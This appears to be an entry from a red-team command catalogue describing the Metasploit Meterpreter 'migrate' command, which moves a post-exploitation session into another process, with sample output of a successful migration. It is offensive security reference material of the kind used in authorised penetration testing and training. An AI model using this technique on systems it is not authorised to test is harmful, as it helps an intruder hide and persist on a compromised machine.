---
id: 2d42f91b-5e09-431e-a943-fc21a21a0376
name: Meterpreter Migrate to a Process
type: command
executor: metasploit
data: migrate $_PID
output: 'meterpreter > migrate 5852

  [*] Migrating from 7256 to 5852...

  [*] Migration completed successfully.'
created_at: '2019-11-14T01:00:13.490166+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Meterpreter Migrate to a Process

```metasploit
migrate $_PID
```

## Expected Output

```
meterpreter > migrate 5852
[*] Migrating from 7256 to 5852...
[*] Migration completed successfully.
```
